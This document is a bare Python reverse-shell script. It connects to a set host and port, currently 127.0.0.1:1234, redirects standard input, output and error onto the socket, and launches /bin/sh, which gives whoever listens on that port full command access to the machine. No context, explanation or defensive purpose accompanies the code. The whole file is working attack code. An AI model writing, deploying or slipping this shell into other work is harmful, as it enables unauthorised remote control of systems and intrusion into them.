import sys, socket, subprocess, os

host = "127.0.0.1"
port = 1234

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))

os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
os.execl( "/bin/sh", "sh" );

conn.close()
